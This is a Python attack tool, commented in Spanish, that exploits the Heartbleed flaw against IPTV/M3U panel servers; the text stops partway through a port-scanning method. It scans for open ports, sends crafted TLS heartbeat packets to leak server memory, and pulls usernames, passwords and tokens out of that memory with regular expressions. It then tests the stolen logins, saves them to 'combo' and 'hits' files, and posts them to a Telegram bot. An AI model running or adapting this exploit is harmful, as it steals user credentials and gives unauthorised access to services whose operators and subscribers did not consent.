hit_messages = []
import requests,string,time, json
from datetime import datetime
from colorama import Fore, Back, Style
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
r = requests.session()
hitc=0
r = requests.session()
import copy
import functools
import json
import string
from datetime import datetime
import threading
from queue import PriorityQueue
import pip
import API_MAC_SCANNER_FINAL

try:
    import colorama
except:
    pip.main(['install', 'coloroma'])
from colorama import Fore,Back, init
import os
from socket import AF_INET, socket
from socket import SOCK_STREAM
from socket import socket

import sys
import struct
import threading
import time

from concurrent.futures import ThreadPoolExecutor, thread
from urllib.parse import urlparse


import requests
import select
import re
import codecs
from optparse import OptionParser

from _socket import SHUT_RDWR
from API_MAC_SCANNER_FINAL import DatosServerM3U,M3U_UTILS,checkFullM3U_URL,BotSenderData
from collections import deque

#-----------------------------------configuraciones--------------------------------------
scanPORTTYPE="LOCAL" #WEB O LOCAL
debug=False#para imprimir las lineas de depuración True | False
totalHilosConsumidores=20
totalHilosProductores=400
nombreFicheroBOT_Telegram="botTelegram_backdoor.ini"
_puertoINICIO_SCAN=0
_puertoFIN_SCAN=30000
#-----------------------------------configuraciones--------------------------------------
import platform
lock = threading.Lock()
lockContenedorDatos=threading.Lock()
version=1.16
                    #Creador @SergioSP75
                    #Ejecucion de HeartBleed contra servidores M3u
                    #Añadido escritura en direcotiros de los combos y las m3u
                    #Añadida lectura de combos anteriores conseguidos, para que estos no se repitan
                    #v1.1
                    #discriminacion entre m3u validas y no validas
                    #Corregido error de M3u no validas
                    #Escritura de los hits a directorio independiente
                    #Añadida lista de canales de la m3u
                    #v1.2
                    #Se pregunta por el tipo de scaneo de puertos LOCAL o WEB
                    #Activado la busqueda con m3u no validas, pero deben estar bien formadas para tener una m3u correcta
                    #v1.3
                    #patron token
                    #patron live corregido
                    #v1.4
#                   #Secuencializados los patrones, no son condicionales, siempre se ejecutan, pues en una entrada pueden existir varios patrones
                    #v1.5
                    #patron live corregido, canales m3u
                    #Ahora se puede elegir el numero de hilos de produccion, lectura del server atacado
                    #Modelo de lectura continua cambiado
                    #v1.6
                        #eliminada la creacion de listas ko
                        #añadido fichero de solo m3u
                    #v1.7
                        #codigo limpiado
                        #Activado la creacion de m3u para cuando se le pasa solamente una dns sin m3u formada y sin puerto, solo la dsn del server
                    #v1.8
                        #añadido utilizacion de variable temporal en el scaneo de puertos, evitamos dos scan si no tenemos puerto base de la m3u
                        #Añadido scaneo lento de puertos, evitando proteccion del servidor destino cuando detecta un scan de puertos
                        #Añadida detección de server final cuando la url es valida, scaneamos el server final, y contruimos la m3u con la m3u introducida por el usuario
                    #v1.81
                        #conotrolado el cierre forzado desde el server de los sockets, ya no se para por este motivo
                    #v1.9
                        #añadido poder enviar a chat de telegram
                    #v1.10
                        #añadido poder indicar la ip del server final , util para cuando tiene varios<<--en desarrollo-->>
                    #v1.12
                        #añadido funcionalidad de multi server de ataque, ahora podemos atacar varios servidores
                    #v1.14
                        #Bloqueo de hilos al escribir los combos, evita la repeticion de resultados
                        #Cambio para garantizar que todos lo hilos tienen el mismo contendor, asi evitamos repeticiones de combos
                    #V1.16
                        #UNIFICACION DEL API_FINAL, eliminacion de metodos repetidos



my_os = platform.system()
print("OS in my system : ", my_os)
hitc=0
rootDir=""
if (my_os == "Windows"):
    rootDir = "."  # windows. the user has to create a directoy with this name, at the same directory  that py script
else:
    rootDir = "/sdcard"  # android
decode_hex = codecs.getdecoder('hex_codec')

#Metodo que crea los directorios usados por el script
def crearDirectoriosBase():
    if os.path.exists(rootDir + "/debug") == False:
        os.mkdir(rootDir + "/debug")
    if os.path.exists(rootDir + "/hits") == False:
        os.mkdir(rootDir + "/hits")
    if os.path.exists(rootDir + "/combosBackDoor") == False:
        os.mkdir(rootDir + "/combosBackDoor")

#clase para localizar los puertos abiertos de una url
class PortScanner:
    header1 = {
        "Host": "www.ipfingerprints.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript,*/*; q=0.01",
        "Content-Type": f"application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent":f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
        "sec-ch-ua-platform": "\"Windows\"",
        "Origin": f"https://www.ipfingerprints.com",
        "Referer": f"https://www.ipfingerprints.com/portscan.php",
        "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
        "Accept-Encoding": "gzip, deflate"
        }

    def tratarSalidaPuertos(self,_entrada: dict):
        # primero separamos por lineas
        separada: list
        puertos = []
        cadena = _entrada['portScanInfo']
        separada = cadena.split("\n")

        for elemento in separada:
            if (elemento.find("tcp") >= 0):
                if (elemento.find("open") >= 0):
                    pos = elemento.find("/")
                    puertos.append(int(elemento[:pos]))
        return puertos
    def createCoockiePanel(self, _host, _startport, _endport):
        coockieDat = {
            "remoteHost": _host,
            "start_port": _startport,
            "end_port": _endport,
            "normalScan": "Yes",
            "scan_type": "connect",
            "ping_type": "none"
        }
        return coockieDat
    # funcion que interroga al servicio de deteccion de puertos abiertos externos

    # funcion que interroga al servicio de deteccion de puertos abiertos externos
    # region Description

    def searchOpenPorts_WEB(self,initPort: int, finishPort: int, ipServerToScan: str):
        print(Fore.GREEN,"Scanning Ports with WEB Method:",ipServerToScan,Fore.RESET)

        parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
        try:
            dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1,
                                data=parametros,
                                timeout=300)  # si en 100 segundos no tenemos respuesta, cancelamos la consulta
            puertos = self.tratarSalidaPuertos(dat.json())
            return puertos
        except Exception as errp:
            print("Error invocando a url para detectar puertos:", errp)
            return []

    #metodo que scanea un puerto de una ip
    def test_port_number(self,host, port):
        # create and configure the socket
        with socket(AF_INET, SOCK_STREAM) as sock:
            # set a timeout of a few seconds
            sock.settimeout(5)
            # connecting may fail
            try:
                # attempt to connect
                sock.connect((host, port))
                print("Puerto encontrado para:",host,":",port)
                # a successful connection was made
                sock.shutdown(SHUT_RDWR)
                sock.close()
                return True
            except:
                # ignore the failure
                sock.close()
                return False
    def port_scan(self,host, port:range,_scaneoLento):
        if scanPORTTYPE=="WEB":
            return self.searchOpenPorts_WEB(port.start,port.stop,host)
        else:
            return self.test_port_numberLOCAL(host,port,_scaneoLento)

    # scanea un rango de puertos, lanzando multiples  hilos para acelerar el scaneo
    def test_port_numberLOCAL(self, host, ports,scaneLento):
        print(f'Scanning Ports with Local Method:{host}...')
        # create the thread pool
        totalHilos=len(ports)
        if scaneLento==0:
            totalHilos=1
        #with ThreadPoolExecutor(len(ports)) as executor:
        with ThreadPoolExecutor(totalHilos) as executor:
            # dispatch all tasks
            #results = executor.map(self.test_port_number, [host] * len(ports), ports)
            results = executor.map(self.test_port_number, [host]*len(ports),ports)
            # report results in order
            openPorts = []
            for port, is_open in zip(ports, results):#anlizamos los datos de cada hilo, y los devolvemos en una liusta
                if is_open:
                    openPorts.append(port)
            if (debug):
                print("Ports:",openPorts)
            return openPorts

#clase encargada de escribir los ficheros de volcado de la memoria a disco
class OutputFileWriter:
    nombreBase:str
    maxSizeperFile:int
    nombreActual:str
    contador:int

    def __int__(self, _nombreBase:str):
        self.nombreBase=_nombreBase
        self.nombreActual=self.nombreBase
        self.contador+=1
    def initValues(self,serverURL):
        self.nombreBase=serverURL.replace(":","_")
        self.nombreBase = self.nombreBase.replace(".", "_")
        self.nombreActual=self.nombreBase
        self.contador=1

    def writeToFile(self,entrada:str):
        try:
            nombreFICHERO=rootDir+"/debug/" + self.nombreActual + ".txt"
            fichero=open(nombreFICHERO,"a")
            file_size = os.path.getsize(nombreFICHERO)
            if (file_size / 1024) > 3000:  # para dividir el fichero de entrada en trozos
                self.nombreActual = self.nombreBase + "_"+str(self.contador)
                self.contador+=1
                fichero = open(rootDir+"/debug/"+self.nombreActual+".txt", "a")
            fichero.write(entrada)
            fichero.close()
        except Exception as errp:
            print("Error escribiendo en fichero de salida DUMP:",errp)

#Clase encargada de almacenar los datos para un esquema productor/consumidor
class DataContainer:
    colaFifo:PriorityQueue
    lock
    def __init__(self):
        self.colaFifo = PriorityQueue()
        self.lock = threading.Lock()

    def put(self,entrada):
        self.lock.acquire()
        self.colaFifo.put(entrada)
        self.lock.release()
    def get(self):
        return self.colaFifo.get()
#Clase encargada de analizar los flujos de entrada, buscando los patrones conocidos y extraer asi los user/pass
#Tambien genera las url m3u validas para esos usuarios
#Esta clase hace de consumidor
class DataAnalyzer:
    miDataContainer:DataContainer
    patronURL_USERNAME_PASSWORD= "username=[A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*"
    patronLISTACANAL_M3U="https?:\/[\/A-z0-9_*!¡@$?.%¿:\-]{3,}"#https?://([A-z0-9_*!¡@$?.%¿:\-]*/){3,}([A-z0-9_*!¡@$?.%¿:\-]*)
    patronREQUEST_URI = "username=([A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*)(REQUEST_METHOD)"
    patronTOKEN="https?:\/\/[A-z0-9_*!¡@$?.%¿:\/]{4,}\/[A-z0-9_*!¡@$?.%¿:\-]*token"
    patronLIVE= "live\/[A-z0-9_*!¡@$?.%¿:\-]{2,}\/[A-z0-9_*!¡@$?¿\-]{2,}"
    patronEXTINF="\/([A-z0-9_*!¡@$?.%¿:\-]*/){4,}([A-z0-9_*!¡@$?.%¿:\-]*)#EXTINF"
    contenedorUSER_PASS:dict
    urlBASE=""
    protocoloBase=""
    puertoBase=""
    primeraVez=True
    nombreFicheroCombos=""
    miDS:DatosServerM3U
    miBotTelegramSender= API_MAC_SCANNER_FINAL.BotSenderData()
    def __init__(self):
        print("CREANDO DataAnalyzer")
        self.miBotTelegramSender.setFileConfigData(nombreFicheroBOT_Telegram)
        if (self.miBotTelegramSender.loadBOTData()):#cargamos los datos del bot
            #el fichero existe, lo usamos
            print(Fore.RED,Back.WHITE,"Usando envio de datos a telegram desde los consumidores:",nombreFicheroBOT_Telegram,Fore.RESET,Back.RESET)
        else:
            self.miBotTelegramSender=None

    #Metodo para almacenar los datos basicos del server a atacar e inicializar datos de ataque. con estos datos se contruyen las listas
    def setURLBase(self,_miDS:DatosServerM3U):
        self.urlBASE = _miDS.panelHost
        self.protocoloBase = _miDS.panelProtocolo
        self.puertoBase = _miDS.panelPuerto
        self.nombreFicheroCombos = (rootDir + "/combosBackDoor/" + "COMBO_" + self.urlBASE.replace(".", "_").replace(":","_") + ".txt")
        self.miDS=_miDS

    def validarM3U(self,entrada: str):
        HEADER1_m3u ={
        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    }
        miM3U_UTILS=M3U_UTILS()
        protocolo, url, user, passw = API_MAC_SCANNER_FINAL.separarUserPass(entrada)
        salida = entrada.replace("get.php", "player_api.php")
        session = requests.Session()
        print("invocando a :", salida)
        try:
            miHitData = API_MAC_SCANNER_FINAL.HitData()
            respuesta = session.get(url=salida,headers=HEADER1_m3u, timeout=2)
            datosLista=respuesta.json()
            if (respuesta.status_code == 200) and (datosLista['user_info']['auth']!=0):
                    miPortalScanner = API_MAC_SCANNER_FINAL.PortalScanner("", "", 1, "", False, "", 0)
                    valorScanner, urlServer, puerto, procolo = checkFullM3U_URL(entrada, session)
                    if ((valorScanner.find("OK") >= 0) or (valorScanner.find("KOK") >= 0)):
                        if (valorScanner.find("KOK") >= 0):
                            miHitData.m3uValid = "NO_SE"
                        else:
                            miHitData.m3uValid = "ONLINE"
                    miHitData.real = url
                    miHitData.url = url
                    miHitData.m3uURL = entrada
                    miM3U_UTILS.extractDataFromList(user, passw, respuesta.text, url, miHitData)
                    listaCanales=miM3U_UTILS.extractChannelListM3U_FromUSER_PASS(url, user, passw)
                    miHitData.livelist=listaCanales
                    return miHitData
            else:
                #if datosLista['user_info']['auth']==0: #lista no activa, pero era valida, baneada? caducada?
                return ""

        except Exception as errp:
            print("Error analizando url:", errp)
            return ""
        print(respuesta.text)

    #Escribe los combos que se van encontrado, el nombre del fichero es el nombre del servidor
    def writeComboToFile(self,user,passw):
        try:
            fichero = open(self.nombreFicheroCombos, "a")
            fichero.write(user+":"+passw)
            fichero.write("\n")
            fichero.close()
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Error escribiendo en fichero Combo"+errp+Fore.RESET+Back.RESET
            print (cadena)

    #lee el combo generado en ejecuciones anteriores, con estos datos evitamos repeticion de listas en distintas ejecucione
    def readComboFromFile(self,miDiccionario:dict):
        try:
                if os.path.exists(self.nombreFicheroCombos) == True:
                    texto=Fore.BLACK+Back.WHITE+"Leyendo fichero de combos previo _"+self.nombreFicheroCombos+Fore.RESET+Back.RESET
                    with open(self.nombreFicheroCombos, 'r')  as f:
                        # Leer todas las líneas del fichero
                        lines = f.readlines()

                    for line in lines:
                        # Separar la línea en clave y valor utilizando los dos puntos como separador
                        key, value = line.split(':')
                        # Añadir la clave y el valor al diccionario
                        miDiccionario[key] = value

                    texto = Fore.BLACK + Back.WHITE + "Extraido un total de combos de _" + str(len(self.contenedorUSER_PASS)) + Fore.RESET + Back.RESET
                    print(texto)

        except Exception as errp:
            print("Error leyendo fichero de combos:"+self.nombreFicheroCombos,"-->",errp)

    #metodo que genera la m3u y graba los HITs a los distintos ficheros
    def generateURL_m3u(self, _user,passw):
        global hitc
        YES2 = f"""
http://{self.urlBASE}:{self.puertoBase}/get.php?username={_user}%26password={passw}%26type=m3u_plus"""
        try:
        	
        
        
        
        
        
            hitc=hitc+1
            print(Fore.CYAN+"\n!!!!!!! FOUND  𝐇𝐈𝐓 ~ 𝐇𝐈𝐓!  💪 !!!!!!!!! \n\n"+Fore.RESET+"HIT NUMERO: "+Fore.CYAN+"《👉》 "+str(hitc)+" 《👈》"+Fore.RESET+"\n\n"+"USER:PASS: "+Fore.YELLOW+_user+":"+passw+Fore.YELLOW+"\n")
            YES = '  TEAMMARIO\n\nhttp://' + self.urlBASE + ':' + str(self.puertoBase) + '\n\nUsuario 😎 =' + _user + '\n\nPass 🔏=' + passw + '\n'
            requests.post(f'https://api.telegram.org/bot/sendMessage?chat_id=&text={YES}\n\n 👁️ M3u~Url {YES2}\n\n______\n')
            if (self.puertoBase!="") and (self.puertoBase!=None): #verificamos que tenga puerto la url
                urlM3U=self.protocoloBase+"://"+self.urlBASE+":"+str(self.puertoBase)+"/get.php?username="+_user+"&password="+passw+"&type=m3u_plus"
            else:
                urlM3U = self.protocoloBase + "://" + self.urlBASE + "/get.php?username=" + _user + "&password=" + passw + "&type=m3u_plus"

            nombreFricheroM3U_OK=(rootDir+"/HITS/HITS_"+self.urlBASE.replace(".","_").replace(":","_")+".txt")
            nombreFricheroM3U_LISTA=(rootDir+"/HITS/HITS_"+self.urlBASE.replace(".","_")+"_m3u.txt")
            nombreFricheroM3U_COMBO = (rootDir + "/HITS/HITS_" + self.urlBASE.replace(".", "_").replace(":","_") + "_COMBO.txt")

            ficheroCOMBO=open(nombreFricheroM3U_COMBO,"a", encoding="utf8")
            ficherFULL=open(nombreFricheroM3U_OK,"a", encoding="utf8")
            fichero_nombreFricheroM3U_COMBO=open(nombreFricheroM3U_LISTA,"a", encoding="utf8")

            if (self.primeraVez):#fecha de ejecucion, solo la primera vez en cada ejecucion
                self.primeraVez = False
                ficherFULL.write("------------------------------------"+time.asctime()+"-------------------------\n")
            miHidata=self.validarM3U(urlM3U)
            if miHidata!='':
                ficherFULL.write(str(miHidata))
                ficherFULL.write("\n")
                ficherFULL.close()
                ficheroCOMBO.write(_user+":"+passw+"\n")
                ficheroCOMBO.close()
                fichero_nombreFricheroM3U_COMBO.write(miHidata.m3uURL+"\n")
                fichero_nombreFricheroM3U_COMBO.close()
                fichero_nombreFricheroM3U_COMBO.close()
                return miHidata
        except Exception as errp:
            print("Error escribiendo al fichero de HITS!!!!!",errp)
            quit()

    def extractDataRequestEXTINF(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Error procesando datos de extracccion de REQUEST_EXTINF:"+errp+ " Datos de entrada:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataRequestLIVE(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Error procesando datos de extracccion de REQUEST_LIVE:"+errp+ " Datos de entrada:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataRequestTOKEN(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Error procesando datos de extracccion de REQUEST_TOKEN:"+errp+ " Datos de entrada:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataREQUEST_URI(self, entrada:str):
        try:
            datos=entrada.split("/")
            user=datos[1]
            passw=datos[2]
            return user, passw
        except Exception as errp:
            cadena = Fore.RED + Back.BLACK + "Error procesando datos de extracccion de REQUEST_URI:" + errp + " Datos de entrada:" + entrada + Fore.RESET + Back.RESET
            print(cadena)
            return "",""
    def extractData_URL_USERNAME_PASSWORD(self, _entrada: str):
        try:
            entrada=_entrada.split("REQUEST")#eliminamos si viene request
            datos = _entrada.split("username=")
            salida = (datos[1].split("&password="))
            user = salida[0]
            passw = salida[1]
            return user, passw
        except Exception as errp:
            cadena = Fore.RED + Back.BLACK + "Error procesando datos de extracccion de REQUEST_LOGIN:" + errp + " Datos de entrada:" + entrada + Fore.RESET + Back.RESET
            return "", ""
    def extractData_LISTACANAL_m3u(self,entrada):
        try:
            datos=entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user,passw
        except:
            return "",""

    def setDataContainer(self,_dataC:DataContainer):
        self.miDataContainer=_dataC

    def setCombosCotainer(self,_miDictCombos:dict):
        self.contenedorUSER_PASS=_miDictCombos

    #Borrar al distribuir
    def writeDebugCode(self,entrada):
        try:
            print(entrada)
            fichero=open(".\debug2\\trazas.txt","a")
            fichero.write("\n"+entrada)
        except:
            False

    #metodo que graba a disco los resultados,modificar esta parte si se quiere hacer algo mas con los HITs de user pass
    def tratarUsuario(self,user, passw):
        global hit
        lock.acquire()
        if (user != ""):
            cadena = Fore.CYAN+"\n\n💪  XPLOIT FUNCIONAL 2024  🤳  \n\n !!!! Տᗴᖇᐯᗴᖇ  =≽  " +Fore.GREEN + self.urlBASE + Fore.RESET + "\n 🕺 U:P =≽ " +Fore.CYAN + user + ":" + passw + Fore.RESET + "\n" + Fore.YELLOW+str(self.miDataContainer.colaFifo.qsize())+Fore.RESET+"\n"+Fore.YELLOW+str(id(self.contenedorUSER_PASS))+Fore.RESET+"\n"+Fore.MAGENTA+threading.current_thread().name +Fore.RESET+"\n 🏅 ᕼITՏ 🏌️‍♀️ =≽ "+Fore.YELLOW+"《🏌️》 "+str(hitc)+" 《🏌️》"+Fore.RESET
            print(cadena)
            if str(self.contenedorUSER_PASS.get(user)) == "None":
                self.contenedorUSER_PASS[user] = passw
                miHitData=self.generateURL_m3u(user, passw)
                self.writeComboToFile(user, passw) #fichero para no repetir los combos encontrados, no es el mismo de hits
                # poner aqui invocacion a TELEGRAM
                if self.miBotTelegramSender!=None:
                    if miHitData!="" and miHitData!=None:
                        print("Enviando datos del hit a Telegram!!!!!")
                        self.miBotTelegramSender.sendMessage(str(miHitData))
            else:
                cadena = "\n"+Fore.WHITE+" User: "+Fore.YELLOW+"" +Fore.RESET+"" +Fore.GREEN + user + ":" + passw + Fore.RESET + ""+Back.RESET
                print(cadena)
        lock.release()
    #Metodo principal de analisis, extrae datos del contenedor, los analiza, compara con los patrones, extrae los user/pass y genera en fichero la m3u valida
    def doAnalyze(self):
        cadena="Iniciando Consumidor:"+Fore.RED+str(id(self))+" ID Contenedor:"+Fore.YELLOW+str(id(self.miDataContainer))+Fore.RESET+" ID Contenodor Combos:"+Fore.RED+str(id(self.contenedorUSER_PASS))+Fore.RESET
        print(cadena)
        while(True):
            user = ""
            passw = ""
            datos=self.miDataContainer.get()
            resultado = re.findall(self.patronLISTACANAL_M3U, datos)
            if (debug):
                print("Analizando datos desde el contenedor...tamaño extraido:",len(datos))
            if (len(resultado) > 0):  # encontrado
                if (debug):
                    cadena = Fore.GREEN + "Entontrado patron LISTACANAL_M3U--->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_LISTACANAL_m3u(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronURL_USERNAME_PASSWORD, datos)
            if (len(resultado)>0):#encontrado
                if (debug):
                    cadena=Fore.GREEN+"Entontrado patron URL_USERNAME_PASSWORD--->:"+datos+Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_URL_USERNAME_PASSWORD(elemento)#esta expresion esta formada por dos segmentos regex
                    self.tratarUsuario(user,passw)
            resultado=re.search(self.patronEXTINF,datos)
            if (resultado!=None):
                if (debug):
                    cadena = Fore.GREEN + "Entontrado patron EXTINF--->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataRequestEXTINF(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronREQUEST_URI,datos)
            if (len(resultado) > 0):  # encontrado
                if (debug):
                    cadena = Fore.GREEN + "Entontrado patron REQUEST_URI--->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataREQUEST_URI(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronTOKEN,datos)
            if (len(resultado) > 0):  # encontrado
                for elemento in resultado:
                    user, passw = self.extractDataRequestTOKEN(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena = Fore.GREEN + "Entontrado patron TOKEN--->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
            resultado = re.findall(self.patronLIVE, datos)
            if (len(resultado) > 0):  # encontrado
                for elemento in resultado:
                    user, passw = self.extractDataRequestLIVE(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena = Fore.GREEN + "Entontrado patron LIVE--->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)

class DataOutputGenerator:
    False

class PanelAttack_SSL:
    miProductor:DataContainer
    # mensaje para inicar la conversacion SSL
    hello = ''' 
            16 03 02 00  dc 01 00 00 d8 03 02 53
            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
            00 0f 00 01 01                                  
            '''
    hb = ''' 
            18 03 02 00 03
            01 40 00
            '''
    miOutputFileWriter:OutputFileWriter
    puertoINICIO_SCAN=_puertoINICIO_SCAN
    puertoFIN_SCAN=_puertoFIN_SCAN
    primeraVEZ_VULNERABLES=True

    def setDataContainer(self,_dataC:DataContainer):
        self.miProductor=_dataC

    def decoceStringToHEX(self,entrada):
        return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]

    def hexdump(self, s):
        #print("*********",s)
        for b in range(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hxdat = ' '.join('%02X' % c for c in lin)
            pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
            print('  %04x: %-48s %s' % (b, hxdat, pdat))

    def recvall(self,s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = b''
        try:
            remain = length
            while remain > 0:
                rtime = endtime - time.time()
                if rtime < 0:
                    return None
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)
                    # EOF?
                    if not data:
                        return None
                    rdata += data
                    remain -= len(data)
            return rdata
        except Exception as errp:
            print("recvall--->error leyendo datos del socket", errp,str(s.getpeername()))
            return None

    def recvmsg(self, s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            if debug:
                print('HDR Unexpected EOF receiving record header - server closed connection',str(s.getpeername()))
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        if pay is None:
            if (debug):
                print('payload Unexpected EOF receiving record payload - server closed connection',str(s.getpeername()))
            return None, None, None
        #print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
        return typ, ver, pay

    def hit_hb(self,s):
        data=self.decoceStringToHEX(self.hb)
        s.send(data)
        while True:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                print('\t\tNo HB response received, server likely not vulnerable')
                return False
            if typ == 24:
                print('\t\tReceived HB response:')
                self.hexdump(pay)
                if len(pay) > 3:
                    print('\t\tServer is vulnerable!')
                else:
                    print('\t\tServer processed malformed data-hello-, but did not return any extra data.')
                return True
            if typ == 21:
                print('Received alert:')
                self.hexdump(pay)
                print('Server returned error, likely not vulnerable')
                return False

    def do_hb_new(self, s):
        while True:
            cadena=Fore.WHITE+"Leyendo datos del servidor"+Fore.GREEN+str(s.getpeername())+Fore.RESET
            #print(cadena)#SERGIO
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if debug:
                    print ("do_hb_new--->No heartbeat response received, server likely not vulnerable")
                return False

            if typ == 24:
                # print 'Received heartbeat response'
                if len(pay) > 3:
                    pdat = "".join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else "") for c in pay)
                    if (debug):
                        self.miOutputFileWriter.writeToFile(pdat)
                    if len(pdat) > 50:  # solo metemos cosas que puedan llevar info, lo pequeño no interesa
                        self.miProductor.put(pdat)
                else:
                    print('Server processed malformed HB, but did not return any extra data.')
                return True
            if typ == 21:
                if debug:
                    print ('do_hb_new--->Received alert:')
                self.hexdumpText(pay)

    #Metodo que verifica la vulnerabilidad del servidor
    def checkHB(self,_url, port:int, _socket:socket):
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Verificando vulnerabiliadd de:",_url)
        _socket.connect((_url, port))
        print('\t\tSending Client Hello...')
        sys.stdout.flush()
        _socket.send(self.decoceStringToHEX(self.hello))
        print('\t\tWaiting for Server Hello...')
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = self.recvmsg(_socket)
            if (typ!=None):
                print("Received message: type = {}, version = {}".format(typ, hex(ver)))
                print("Verificando HB pay", pay, " pos 0:", pay[0], "--->", 0x0E)
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:
                    print('Sending heartbeat request...')
                    sys.stdout.flush()
                    data = self.decoceStringToHEX(self.hb)
                    _socket.send(data)
                    if (self.hit_hb(_socket)):
                        return True
            else:
                print('\t\tServer closed connection without sending Server Hello.')
                _continue = False
                # return
            # Look for server hello done message.

    #Extraemos los puertos abierto
    def extractPort(self,url,_scaneoLento):
        print("1.-->Iniciando busqueda de puertos de:",Fore.WHITE,url,Fore.RESET)
        miPortScanner=PortScanner()
        url=url.replace("/","")
